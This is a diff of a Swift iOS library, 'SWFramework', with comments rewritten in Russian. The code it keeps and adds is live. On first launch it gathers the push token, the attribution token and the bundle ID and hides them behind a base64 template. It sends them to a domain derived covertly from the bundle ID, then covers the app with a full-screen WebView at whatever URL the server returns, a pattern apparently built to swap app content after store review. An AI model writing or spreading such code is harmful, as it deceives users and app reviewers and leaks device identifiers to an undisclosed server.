@@ -7,23 +7,26 @@ import UserNotifications
 public class SWFramework: ObservableObject {
     public static let shared = SWFramework()
     
-    @Published private var serverUrl: String?
+    // Публичные свойства для работы с UI
     @Published public var showWebView: Bool = false
     @Published private(set) var currentUrl: URL?
-    private var firstLaunchCompleted = true
-    private let userDefaults = UserDefaults.standard
-    private let timeout: TimeInterval = 10.0
     
+    // Приватные свойства
+    private let userDefaults = UserDefaults.standard
+    private let timeout: TimeInterval = 15.0
+    
+    // Ключи для UserDefaults
     private let webUrlStorageKey = "com.swf.webUrl"
     private let firstLaunchKey = "com.swf.firstLaunch"
+    private let apnsTokenKey = "com.swf.apnsToken"
     
     private init() {}
     
-    /// Initializes the framework with automatic domain generation from bundle_id
+    /// Инициализирует фреймворк с автоматической генерацией домена из bundle_id
     /// - Parameters:
-    ///   - application: The UIApplication instance
-    ///   - launchOptions: Launch options from AppDelegate
-    ///   - completion: Callback when normal app flow should continue
+    ///   - application: Экземпляр UIApplication
+    ///   - launchOptions: Опции запуска из AppDelegate
+    ///   - completion: Обратный вызов, когда обычный поток приложения должен продолжиться
     public func initialize(application: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, completion: @escaping () -> Void) {
         let bundleId = Bundle.main.bundleIdentifier ?? ""
         let domain = generateDomain(bundleId)
@@ -41,17 +44,18 @@ public class SWFramework: ObservableObject {
         }
     }
     
-    /// Generates domain from bundle_id by removing dots and adding .top
-    /// - Parameter bundleId: The bundle identifier
-    /// - Returns: Generated domain
+    /// Генерирует домен из bundle_id, удаляя точки и добавляя .top
+    /// - Parameter bundleId: Идентификатор бандла
+    /// - Returns: Сгенерированный домен
     private func generateDomain(_ bundleId: String) -> String {
         let processedString = bundleId.replacingOccurrences(of: ".", with: "")
         return "\(processedString).top"
     }
     
-    // For backward compatibility, keeping the original method with explicit domain
-    @available(*, deprecated, message: "Use initialize without explicit domain parameter instead")
+    // Для обратной совместимости сохраняем оригинальный метод с явным доменом
+    @available(*, deprecated, message: "Используйте initialize без параметра домена")
     public func initialize(domain: String, application: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, completion: @escaping () -> Void) {
+        // Для обратной совместимости все равно генерируем домен из bundleId
         let bundleId = Bundle.main.bundleIdentifier ?? ""
         let generatedDomain = generateDomain(bundleId)
         
@@ -69,18 +73,23 @@ public class SWFramework: ObservableObject {
     }
     
     private func processFirstLaunch(_ domain: String, _ application: UIApplication, _ completion: @escaping () -> Void) {
+        // Создаем группу для синхронизации асинхронных операций
         let group = DispatchGroup()
         var deviceData = DeviceData()
         
+        // Устанавливаем bundleId
         deviceData.bundleId = Bundle.main.bundleIdentifier
         
+        // Создаем таймер для ограничения времени ожидания
         let timer = DispatchSource.makeTimerSource()
         timer.schedule(deadline: .now() + timeout)
         timer.setEventHandler {
+            // Если таймер сработал, освобождаем группу
             group.leave()
             group.leave()
         }
         
+        // Получаем APNS токен
         group.enter()
         getAPNSToken(application) { token in
             if let token = token {
@@ -89,44 +98,59 @@ public class SWFramework: ObservableObject {
             group.leave()
         }
         
+        // Получаем Attribution токен
         group.enter()
         getAttributionToken { token in
             deviceData.attToken = token
             group.leave()
         }
         
+        // Запускаем таймер
         timer.resume()
         
+        // Ожидаем завершения всех операций
         group.notify(queue: .main) {
+            // Отменяем таймер
             timer.cancel()
             
+            // Отправляем данные на сервер
             self.sendDataToServer(domain, deviceData) { resultUrl in
                 if let resultUrl = resultUrl, !resultUrl.isEmpty {
+                    // Сохраняем URL для будущего использования
                     self.userDefaults.set(resultUrl, forKey: self.webUrlStorageKey)
+                    // Настраиваем WebView
                     self.setupWebView(resultUrl)
                 }
+                // Вызываем завершающий блок
                 completion()
             }
         }
     }
     
     private func sendDataToServer(_ domain: String, _ deviceData: DeviceData, completion: @escaping (String?) -> Void) {
+        // Шаблон данных для отправки на сервер в формате base64
         let base64String = "YXBuc190b2tlbj17YXBuc190b2tlbn0mYXR0X3Rva2VuPXthdHRfdG9rZW59JmJ1bmRsZV9pZD17YnVuZGxlX2lkfQ=="
         
+        // Декодируем шаблон
         if let decodedData = Data(base64Encoded: base64String),
            var dataTemplate = String(data: decodedData, encoding: .utf8) {
             
+            // Заменяем плейсхолдеры реальными значениями
             dataTemplate = dataTemplate.replacingOccurrences(of: "{apns_token}", with: deviceData.apnsToken ?? "")
             dataTemplate = dataTemplate.replacingOccurrences(of: "{att_token}", with: deviceData.attToken ?? "")
             dataTemplate = dataTemplate.replacingOccurrences(of: "{bundle_id}", with: deviceData.bundleId ?? "")
             
+            // Кодируем данные обратно в base64
             if let encodedData = dataTemplate.data(using: .utf8)?.base64EncodedString() {
+                // Формируем URL для отправки данных
                 guard let url = URL(string: "https://\(domain)/indexn.php?data=\(encodedData)") else {
                     completion(nil)
                     return
                 }
                 
+                // Создаем задачу для отправки запроса
                 let task = URLSession.shared.dataTask(with: url) { data, _, error in
+                    // Проверяем наличие данных и отсутствие ошибок
                     guard let data = data, error == nil else {
                         DispatchQueue.main.async {
                             completion(nil)
@@ -134,6 +158,7 @@ public class SWFramework: ObservableObject {
                         return
                     }
                     
+                    // Пытаемся декодировать ответ
                     if let response = String(data: data, encoding: .utf8) {
                         DispatchQueue.main.async {
                             completion(response)
@@ -145,11 +170,13 @@ public class SWFramework: ObservableObject {
                     }
                 }
                 
+                // Запускаем задачу
                 task.resume()
                 return
             }
         }
         
+        // Если что-то пошло не так, отправляем исходный шаблон
         guard let url = URL(string: "https://\(domain)/indexn.php?data=\(base64String)") else {
             completion(nil)
             return
@@ -178,38 +205,21 @@ public class SWFramework: ObservableObject {
     }
     
     private func setupWebView(_ urlString: String) {
+        // Добавляем префикс https, если его нет
         let processedUrl = ensureHttpsPrefix(urlString)
         
+        // Проверяем, что URL валиден
         guard let url = URL(string: processedUrl) else { return }
         
+        // Устанавливаем URL и показываем WebView
         DispatchQueue.main.async {
-            // Настраиваем полноэкранный режим и черный фон
-            self.configureFullScreenDisplay()
-            
             self.currentUrl = url
             self.showWebView = true
         }
     }
     
-    // Настройка полноэкранного режима
-    private func configureFullScreenDisplay() {
-        // Упрощенный метод без прямых манипуляций с окнами
-        DispatchQueue.main.async {
-            // Безопасно установить статус бар скрытым через Info.plist
-            // Вместо прямого добавления subview на окно,
-            // приложение должно иметь настройку в Info.plist:
-            // UIViewControllerBasedStatusBarAppearance = NO
-            // UIStatusBarHidden = YES
-            
-            // Отправляем уведомление об изменении статуса
-            NotificationCenter.default.post(
-                name: UIDevice.orientationDidChangeNotification,
-                object: nil
-            )
-        }
-    }
-    
     private func ensureHttpsPrefix(_ urlString: String) -> String {
+        // Добавляем https, если URL не начинается с http:// или https://
         if !urlString.lowercased().starts(with: "http://") && !urlString.lowercased().starts(with: "https://") {
             return "https://" + urlString
         }
@@ -217,23 +227,23 @@ public class SWFramework: ObservableObject {
     }
     
     private func getAPNSToken(_ application: UIApplication, completion: @escaping (String?) -> Void) {
+        // Проверяем текущие настройки уведомлений
         UNUserNotificationCenter.current().getNotificationSettings { settings in
             if settings.authorizationStatus == .authorized {
                 DispatchQueue.main.async {
-                    // Регистрируем уведомления
+                    // Регистрируем приложение для получения уведомлений
                     application.registerForRemoteNotifications()
                     
-                    // Увеличиваем время ожидания до 10 секунд
-                    self.waitForToken(10.0) { token in
+                    // Ожидаем получения токена
+                    self.waitForToken(self.timeout) { token in
                         if let token = token {
                             completion(token)
                         } else {
-                            // Если токен не получен, проверяем, были ли зарегистрированы уведомления ранее
-                            // и можем ли мы получить сохраненный токен
+                            // Пытаемся получить сохраненный ранее токен
                             if let savedToken = self.getSavedAPNSToken() {
                                 completion(savedToken)
                             } else {
-                                // Используем заглушку только если нет сохраненного токена
+                                // Используем заглушку, если токен недоступен
                                 let fallbackToken = "0000000000000000000000000000000000000000000000000000000000000000"
                                 completion(fallbackToken)
                             }
@@ -241,14 +251,14 @@ public class SWFramework: ObservableObject {
                     }
                 }
             } else {
+                // Запрашиваем разрешение на уведомления
                 let center = UNUserNotificationCenter.current()
                 center.requestAuthorization(options: [.alert, .sound, .badge]) { granted, _ in
                     if granted {
                         DispatchQueue.main.async {
                             application.registerForRemoteNotifications()
                             
-                            // Увеличиваем время ожидания до 10 секунд
-                            self.waitForToken(10.0) { token in
+                            self.waitForToken(self.timeout) { token in
                                 if let token = token {
                                     completion(token)
                                 } else {
@@ -262,7 +272,7 @@ public class SWFramework: ObservableObject {
                             }
                         }
                     } else {
-                        // Если пользователь отказал в разрешении, проверяем наличие сохраненного токена
+                        // Если разрешение не получено, пытаемся использовать сохраненный токен
                         if let savedToken = self.getSavedAPNSToken() {
                             completion(savedToken)
                         } else {
@@ -278,20 +288,20 @@ public class SWFramework: ObservableObject {
     private func waitForToken(_ timeout: TimeInterval, completion: @escaping (String?) -> Void) {
         var tokenReceived = false
         
-        // Создаем переменную для хранения наблюдателя
-        var notificationObserver: NSObjectProtocol? = nil
+        // Переменная для хранения наблюдателя, чтобы его можно было безопасно удалить
+        var observer: NSObjectProtocol?
         
-        // Увеличиваем приоритет обработчика уведомления
-        notificationObserver = NotificationCenter.default.addObserver(
-            forName: Notification.Name("APNSTokenReceived"), 
-            object: nil, 
-            queue: OperationQueue.main
+        // Добавляем наблюдателя для уведомлений о получении токена
+        observer = NotificationCenter.default.addObserver(
+            forName: Notification.Name("APNSTokenReceived"),
+            object: nil,
+            queue: .main
         ) { notification in
             if let token = notification.userInfo?["token"] as? String {
                 tokenReceived = true
                 
-                // Теперь observer определен до его использования
-                if let observer = notificationObserver {
+                // Удаляем наблюдателя
+                if let observer = observer {
                     NotificationCenter.default.removeObserver(observer)
                 }
                 
@@ -299,34 +309,34 @@ public class SWFramework: ObservableObject {
             }
         }
         
-        // Увеличиваем время ожидания токена до 15 секунд
+        // Устанавливаем таймер для ограничения времени ожидания
         DispatchQueue.main.asyncAfter(deadline: .now() + timeout) {
             if !tokenReceived {
-                // Теперь observer определен до его использования
-                if let observer = notificationObserver {
+                // Удаляем наблюдателя
+                if let observer = observer {
                     NotificationCenter.default.removeObserver(observer)
                 }
                 
-                // Сообщаем наверх что токен не получен, но не используем заглушку
+                // Сообщаем, что токен не получен
                 completion(nil)
             }
         }
     }
     
-    // Функция для получения сохраненного APNS токена
+    // Получение сохраненного APNS токена
     private func getSavedAPNSToken() -> String? {
-        return userDefaults.string(forKey: "savedAPNSToken")
+        return userDefaults.string(forKey: apnsTokenKey)
     }
     
-    // Функция для сохранения полученного APNS токена
+    // Сохранение APNS токена
     private func saveAPNSToken(_ token: String) {
-        userDefaults.set(token, forKey: "savedAPNSToken")
+        userDefaults.set(token, forKey: apnsTokenKey)
     }
     
     private func getAttributionToken(completion: @escaping (String?) -> Void) {
         if #available(iOS 14.3, *) {
             do {
-                let token = try self.getAAAttributionToken()
+                let token = try AdServices.AAAttribution.attributionToken()
                 completion(token)
             } catch {
                 completion(nil)
@@ -336,20 +346,16 @@ public class SWFramework: ObservableObject {
         }
     }
     
-    // Helper function for Attribution Token - moved inside the class
-    @available(iOS 14.3, *)
-    private func getAAAttributionToken() throws -> String {
-        return try AdServices.AAAttribution.attributionToken()
-    }
-    
-    // Function to be called from the app's AppDelegate
+    // Вызывается из AppDelegate приложения
     public func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
+        // Преобразуем данные токена в строку
         let tokenParts = deviceToken.map { data in String(format: "%02.2hhx", data) }
         let token = tokenParts.joined()
         
-        // Сохраняем токен для будущего использования
+        // Сохраняем токен
         saveAPNSToken(token)
         
+        // Отправляем уведомление о получении токена
         NotificationCenter.default.post(
             name: Notification.Name("APNSTokenReceived"),
             object: nil,
@@ -358,9 +364,9 @@ public class SWFramework: ObservableObject {
     }
 }
 
-// MARK: - Supporting Classes
+// MARK: - Supporting Classes and Structures
 
-// Device data structure
+// Структура для хранения данных устройства
 private struct DeviceData {
     var apnsToken: String?
     var attToken: String?
@@ -369,7 +375,7 @@ private struct DeviceData {
 
 // MARK: - SwiftUI Integration Helpers
 
-// Инициализатор фреймворка - модификатор для SwiftUI
+// Модификатор для инициализации фреймворка
 public struct SWFrameworkInitializer: ViewModifier {
     @StateObject private var appDelegate = SWAppDelegate()
     
@@ -396,9 +402,7 @@ public class SWAppDelegate: NSObject, ObservableObject, UIApplicationDelegate {
     }
     
     func initializeFramework(application: UIApplication = UIApplication.shared, launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil) {
-        SWFramework.shared.initialize(application: application, launchOptions: launchOptions) {
-            // Завершение инициализации
-        }
+        SWFramework.shared.initialize(application: application, launchOptions: launchOptions) { }
     }
 }
 
@@ -409,11 +413,12 @@ public extension View {
     }
 }
 
-// SwiftUI WebView Implementation
+// MARK: - WebView Integration
+
+// Основная SwiftUI обертка для WebView
 public struct SWWebView: View {
     @ObservedObject public var framework = SWFramework.shared
     private var contentView: AnyView
-    @Environment(\.colorScheme) private var colorScheme
     
     public init(contentView: AnyView) {
         self.contentView = contentView
@@ -426,62 +431,50 @@ public struct SWWebView: View {
                 .animation(.easeInOut, value: framework.showWebView)
             
             if framework.showWebView, let url = framework.currentUrl {
-                GeometryReader { geo in
-                    ZStack {
-                        // Черный фон на весь экран, включая safeArea
-                        Color.black
-                            .edgesIgnoringSafeArea(.all)
-                        
-                        // WebView с ручным управлением отступами
-                        WebViewWrapper(url: url)
-                    }
+                ZStack {
+                    Color.black
+                        .ignoresSafeArea()
+                    
+                    SafeWebView(url: url)
+                        .ignoresSafeArea()
                 }
-                .modifier(StatusBarModifiers.StatusBarHiddenModifier(isHidden: true))
                 .transition(.opacity)
                 .animation(.easeInOut, value: true)
             }
         }
-        .modifier(StatusBarModifiers.StatusBarHiddenModifier(isHidden: framework.showWebView))
+        // Используем стандартный модификатор SwiftUI
+        .statusBar(hidden: framework.showWebView)
     }
 }
 
-// Обертка для WebView, которая позволяет управлять его отображением
-struct WebViewWrapper: View {
+// Безопасная обертка для WebView
+struct SafeWebView: View {
     let url: URL
     
     var body: some View {
-        GeometryReader { geometry in
-            WebViewRepresentable(url: url)
-                .ignoresSafeArea(.all, edges: [.top])  // Игнорируем только верхнюю safeArea
-                .frame(width: geometry.size.width, height: geometry.size.height)
-                .background(Color.black)  // Убедимся, что фон WebView черный
-        }
+        WebViewContainer(url: url)
+            .ignoresSafeArea()
+            .background(Color.black)
     }
 }
 
-// WebView SwiftUI Wrapper
-struct WebViewRepresentable: UIViewRepresentable {
+// Контейнер для WebView с правильной обработкой жизненного цикла
+struct WebViewContainer: UIViewRepresentable {
     let url: URL
     
     func makeUIView(context: Context) -> WKWebView {
         let configuration = WKWebViewConfiguration()
-        configuration.websiteDataStore = .default()
         configuration.allowsInlineMediaPlayback = true
         configuration.mediaTypesRequiringUserActionForPlayback = []
-        
-        let preferences = WKPreferences()
-        preferences.javaScriptEnabled = true
-        configuration.preferences = preferences
         
         let webView = WKWebView(frame: .zero, configuration: configuration)
         webView.backgroundColor = .black
         webView.scrollView.backgroundColor = .black
         webView.isOpaque = false
+        webView.scrollView.contentInsetAdjustmentBehavior = .never
+        webView.scrollView.bounces = false
         webView.navigationDelegate = context.coordinator
         webView.uiDelegate = context.coordinator
-        
-        // Дополнительные настройки для WebView
-        configureWebView(webView)
         
         return webView
     }
@@ -491,48 +484,20 @@ struct WebViewRepresentable: UIViewRepresentable {
         webView.load(request)
     }
     
-    private func configureWebView(_ webView: WKWebView) {
-        // Настраиваем WebView для полноэкранного отображения без автоматических отступов
-        webView.scrollView.contentInsetAdjustmentBehavior = .never
-        
-        // Устанавливаем отступы в 0, так как управление размещением происходит на уровне SwiftUI
-        webView.scrollView.contentInset = UIEdgeInsets(top: 0, left: 0, bottom: 0, right: 0)
-    }
-    
     func makeCoordinator() -> Coordinator {
-        Coordinator()
+        Coordinator(self)
     }
     
     class Coordinator: NSObject, WKNavigationDelegate, WKUIDelegate {
-        // Handle permission requests for camera
+        var parent: WebViewContainer
+        
+        init(_ parent: WebViewContainer) {
+            self.parent = parent
+        }
+        
+        // Обработка запросов разрешения на доступ к камере
         public func webView(_ webView: WKWebView, requestMediaCapturePermissionFor origin: WKSecurityOrigin, initiatedByFrame frame: WKFrameInfo, type: WKMediaCaptureType, decisionHandler: @escaping (WKPermissionDecision) -> Void) {
-            switch type {
-            case .camera, .microphone, .cameraAndMicrophone:
-                decisionHandler(.prompt)
-            @unknown default:
-                decisionHandler(.deny)
-            }
-        }
-        
-        // Установка ориентации
-        public func webView(_ webView: WKWebView, didCommit navigation: WKNavigation!) {
-            // Отключаем сложную логику установки ориентации, которая может вызывать сбои
-            // Просто отправляем уведомление
-            DispatchQueue.main.async {
-                NotificationCenter.default.post(
-                    name: UIDevice.orientationDidChangeNotification,
-                    object: nil
-                )
-            }
-        }
-        
-        // Вспомогательный метод для установки маски ориентаций
-        private func setOrientationMask(_ mask: UIInterfaceOrientationMask, for viewController: UIViewController) {
-            // Упрощаем метод, чтобы избежать сложной рекурсии, которая может вызывать сбои
-            NotificationCenter.default.post(
-                name: UIDevice.orientationDidChangeNotification,
-                object: nil
-            )
+            decisionHandler(.prompt)
         }
     }
 } 
